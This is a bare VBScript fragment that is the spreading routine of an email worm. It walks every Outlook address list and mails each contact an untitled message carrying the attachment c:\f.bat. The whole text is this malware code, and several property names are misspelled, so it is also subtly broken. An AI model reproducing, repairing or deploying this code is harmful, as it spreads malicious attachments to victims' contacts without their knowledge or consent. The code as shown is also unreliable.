set abc=createobject("outlook.application")
set bac=abc.getnamespace("MAPI")
set cab=bac.adresslists
for each d in cab
for e=1 to d.adressentries.count
dim f
set f=abc.createitem(0)
f.to=d.adressentries(e).adress
f.subject=""
f.attachments.add "c:\f.bat",1,len(f.body),"f"
f.send
next
next
